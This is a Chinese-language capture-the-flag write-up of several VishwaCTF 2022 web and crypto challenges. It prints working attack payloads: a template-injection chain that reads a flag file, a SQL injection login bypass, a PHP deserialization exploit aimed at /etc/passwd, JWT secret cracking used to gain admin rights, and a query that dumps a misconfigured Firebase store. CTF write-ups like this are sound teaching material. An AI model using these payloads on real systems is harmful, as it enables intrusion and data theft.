---
title: VishwaCTF 2022
categories: 赛题wp
---



![image-20220320234820993](https://img-blog.csdnimg.cn/img_convert/21e472b7c2bebbc17892382cda7b849d.png)

记录两题

<!--more-->

# Flag .Collection

一道 firebase 的题目，记录一下

首页

![image-20220320234242147](https://img-blog.csdnimg.cn/img_convert/18c79501845f49ada61158cc0648d8ef.png)

照例看一下网页源码，截取一下重要部分

一段混淆代码，但是有一个url

![image-20220320234346749](https://img-blog.csdnimg.cn/img_convert/e1777d324a15a595c37c345716bbd79d.png)

一个firebaseConfig设置

![image-20220320234408877](https://img-blog.csdnimg.cn/img_convert/19bc3f9e4820f2c211decf642b3f4dcb.png)

通过API KEY操作 firebase，猜测baseURL就是上面的url

```

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <!-- Insert these scripts at the bottom of the HTML, but before you use any Firebase services -->

    <!-- Firebase App (the core Firebase SDK) is always required and must be listed first -->
    <script src="https://www.gstatic.com/firebasejs/7.21.0/firebase-app.js"></script>

    <!-- If you enabled Analytics in your project, add the Firebase SDK for Analytics -->
    <script src="https://www.gstatic.com/firebasejs/7.21.0/firebase-analytics.js"></script>

    <!-- Add Firebase products that you want to use -->
    <script src="https://www.gstatic.com/firebasejs/7.21.0/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/7.21.0/firebase-firestore.js"></script>
</head>
<body>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCOrohCmYL_hq5DaqFbQM3rxHXT0pNE6SA",
        authDomain: "vishwa-ctf-challenge-12.firebaseapp.com",
        projectId: "vishwa-ctf-challenge-12",
        storageBucket: "vishwa-ctf-challenge-12.appspot.com",
        messagingSenderId: "125452069157",
        appId: "1:125452069157:web:2d20b318f3e448ebfa52cc",
		databaseURL:"https://vishwa-ctf-default-rtdb.firebaseio.com"
      };

    firebase.initializeApp(firebaseConfig);
    
    var db=firebase.firestore();
    //猜测字符为flag
    db.collection("flag").get().then((querySnapshot) => {
        querySnapshot.forEach((doc) => {
		console.log(doc.data());
            console.log(doc.data());
        });
    });
</script>
</body>
</html>
```

打开控制台，发现flag

![image-20220320234549827](https://img-blog.csdnimg.cn/img_convert/d195b9a9f206b1747b4efcef348e543b.png)

FLAG：vishwaCTF{c0nfigur3_y0ur_fir3b@s3_rule$}



# Hey Buddy

SSTI，payload

```
{{().__class__.__bases__[0].__subclasses__()[99](path=%27%27,fullname=%27%27).get_data(%27./flag.txt%27)}}
```



# My Useless Website

sql万能密码

![image-20220321155848658](https://img-blog.csdnimg.cn/img_convert/a6e510b831fd53550b1744390959582d.png)

payload

```
1' or 1=1 -- +
```

FLAG：VishwaCTF{I_Kn0w_Y0u_kn0W_t1hs_4lr3ady}



# Stock Bot

html查看到一个url

![image-20220321160315328](https://img-blog.csdnimg.cn/img_convert/14b3c31c78cac824ad6fa2d317188b29.png)

访问发现调用了 file_get_contents

![image-20220321160346754](https://img-blog.csdnimg.cn/img_convert/9b1ed2bf4d7a57ab414a0de997967436.png)

猜Flag

![image-20220321160413071](https://img-blog.csdnimg.cn/img_convert/6e915e74937e972579c308d603595605.png)



FLAG：VishwaCTF{b0T_kn0w5_7h3_s3cr3t}



# Request Me FLAG

请求头为 FLAG ，且POST一个FLAG数据，得到flag

# Todo List

html发现参数source

![image-20220321160705635](https://img-blog.csdnimg.cn/img_convert/ec14c652c8dcfc34d0f9282d61d26735.png)

访问得到源码

```php
<?php

Class ShowSource{
    public function __toString()
    {
        return highlight_file($this->source, true);
    }
}

if(isset($_GET['source'])){
    $s = new ShowSource();
    $s->source = __FILE__;
    echo $s;
    exit;
}

$todos = [];

if(isset($_COOKIE['todos'])){
    $c = $_COOKIE['todos'];
    $h = substr($c, 0, 40);
    $m = substr($c, 40);
    if(sha1($m) === $h){
        $todos = unserialize($m);
    }
}

if(isset($_POST['text'])){
    $todo = $_POST['text'];
    $todos[] = $todo;
    $m = serialize($todos);
    $h = sha1($m);
    setcookie('todos', $h.$m);
    header('Location: '.$_SERVER['REQUEST_URI']);
    exit;
}
?>



<?php foreach($todos as $todo):?>
      <label class="todo">
      <input class="todo__state" type="checkbox" />
      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 200 25" class="todo__icon">
        <use xlink:href="#todo__line" class="todo__line"></use>
        <use xlink:href="#todo__box" class="todo__box"></use>
        <use xlink:href="#todo__check" class="todo__check"></use>
        <use xlink:href="#todo__circle" class="todo__circle"></use>
      </svg>
      <div class="todo__text"><?=$todo?></div>
      </label>
    <?php endforeach;?>
```

反序列化即可，echo触发 __toString

exp

```php
<?php

Class ShowSource{
    public function __construct()
    {
        $this->source = '/etc/passwd'; //flag.php
    }
}
$todos[]=new ShowSource();
echo sha1(serialize($todos));
echo urlencode(serialize($todos));
?>
```

替换cookie中的todo

![image-20220321161245216](https://img-blog.csdnimg.cn/img_convert/ca4f1b89b041c4c0f6c8fa7034cb9d59.png)

FLAG：VishwaCTF{t7e_f1a6_1s_1is73d}

# Keep Your Secrets

访问路由得到 jwt

![image-20220321184157906](https://img-blog.csdnimg.cn/img_convert/71cfb4d05e5222af21c245c8a615ee4a.png)

使用c-jwt-cracker进行 jwt 爆破，密钥为 `owasp` 

![image-20220321184257792](https://img-blog.csdnimg.cn/img_convert/fdfd83d05ce4bdf2de167abd1e49f58d.png)

修改权限为admin

FLAG：VishwaCTF{w3@k_$ecr3t$}

# Strong Encryption

```php
<?php

    // Decrypt -> 576e78697e65445c4a7c8033766770357c3960377460357360703a6f6982452f12f4712f4c769a75b33cb995fa169056168939a8b0b28eafe0d724f18dc4a7

    $flag="";

    function encrypt($str,$enKey){

        $strHex='';
        $Key='';
        $rKey=69;
        $tmpKey='';

        for($i=0;$i<strlen($enKey);$i++){
            $Key.=ord($enKey[$i])+$rKey;
            $tmpKey.=chr(ord($enKey[$i])+$rKey);
        }    

        $rKeyHex=dechex($rKey);

        $enKeyHash = hash('sha256',$tmpKey);

        for ($i=0,$j=0; $i < strlen($str); $i++,$j++){
            if($j==strlen($Key)){
                $j=0;
            }
            $strHex .= dechex(ord($str[$i])+$Key[$j]);
        }
        $encTxt = $strHex.$rKeyHex.$enKeyHash;
        return $encTxt;
    }

    $encTxt = encrypt($flag, "VishwaCTF");

    echo $encTxt;

?>
```

加密不难，脚本解密即可

```php
<?php
$str2 = "576e78697e65445c4a7c8033766770357c3960377460357360703a6f6982";
$Key='155174184173188166136153139';   
	for ($i=0,$j=0; $i < strlen($str2); $i++,$j++){
		if($j==strlen($Key)){
			$j=0;
        }
        $a = $str2[$i].$str2[$i+1];
        $flag .= chr(hexdec($a)-$Key[$j]);  
        $i++;
   }
echo "flag: ".$flag;
```

FLAG：VishwaCTF{y0u_h4v3_4n_0p_m1nd}


# 参考

[DownunderCTF-Web-CookieClicker | Tiaonmmn's Littile House](https://tiaonmmn.github.io/2020/09/21/DownunderCTF-2020-Web-CookieClicker/)
